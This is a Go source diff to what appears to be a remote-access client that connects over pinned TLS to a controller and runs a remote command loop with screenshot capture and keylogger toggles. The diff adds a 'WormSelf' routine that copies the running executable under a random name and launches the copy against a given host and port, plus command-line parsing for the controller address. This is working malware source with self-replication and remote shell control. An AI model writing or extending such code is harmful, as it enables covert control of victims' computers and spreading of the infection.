@@ -8,10 +8,13 @@ import (
 	"fmt"
 	"image/png"
 	"io"
+	"io/ioutil"
 	"log"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -27,10 +30,60 @@ const BUFFSIZE = 512
 // MASKMANAGERIP connection string to the maskmanager
 const MASKMANAGERIP = "127.0.0.1:5001"
 
+var PORT = "127.0.0.1:5001"
+
 // PINNEDFPRINT fingerprint pinning to escape from MITM
 const PINNEDKEY = "42:89:77:7B:40:80:2E:7B:06:82:10:C3:61:E4:E3:56:FB:90:92:E4:40:B2:30:3E:44:29:9D:28:2F:5B:3E:D8"
+const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
+func RandStringBytes(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letterBytes[rand.Intn(len(letterBytes))]
+	}
+	return string(b)
+}
+
+func check(e error) {
+	if e != nil {
+		panic(e)
+	}
+}
+func WormSelf(fileUser string) {
+
+	print(fileUser)
+	data, err := ioutil.ReadFile(fileUser)
+	check(err)
+
+	fileworm := RandStringBytes(8) + ".exe"
+	check(err)
+
+	err = ioutil.WriteFile(fileworm, data, 0644)
+	check(err)
+	_, err = exec.Command(".\\"+fileworm, "127.0.0.1", "5001").Output()
+	if err != nil {
+		switch e := err.(type) {
+		case *exec.Error:
+			fmt.Println("failed executing:", err)
+		case *exec.ExitError:
+			fmt.Println("command exit rc =", e.ExitCode())
+		default:
+			panic(err)
+		}
+	}
+}
 func main() {
+	arguments := os.Args
+	filename := filepath.Base(os.Args[0])
+	print(filename)
+	if len(arguments) == 2 {
+		fmt.Println("Please provide a host and a port number! like this Rev.exe 127.0.0.1 5001")
+		PORT = "127.0.0.1:5001"
+		//return
+	} else {
+		PORT = arguments[1] + ":" + arguments[2]
+	}
+
 	fingerprint := strings.Replace(PINNEDKEY, ":", "", -1)
 	fingerprintbytes, err := hex.DecodeString(fingerprint)
 	if err != nil {
@@ -43,7 +96,7 @@ func main() {
 	}
 	pinnedcertmatched := pinnedcertcheck(conn, fingerprintbytes)
 	if pinnedcertmatched {
-		getmaskedshell(conn)
+		getmaskedshell(conn, filename)
 	} else {
 		fmt.Println(color.RedString("cert problem"))
 		os.Exit(1)
@@ -99,7 +152,7 @@ func getscreenshot() []string {
 	return filenames
 }
 
-func getmaskedshell(conn *tls.Conn) {
+func getmaskedshell(conn *tls.Conn, filename string) {
 	var cmdbuff []byte
 	var command string
 	cmdbuff = make([]byte, BUFFSIZE)
@@ -139,7 +192,7 @@ func getmaskedshell(conn *tls.Conn) {
 		} else if strings.Index(command, "KeyCreaperOFF") == 0 {
 
 		} else if strings.Index(command, "WormSelf") == 0 {
-
+			WormSelf(filename)
 		} else if strings.Index(command, "MoneyThoseSectoids") == 0 { //TODO
 
 		} else if strings.Index(command, "grabscreen") == 0 {
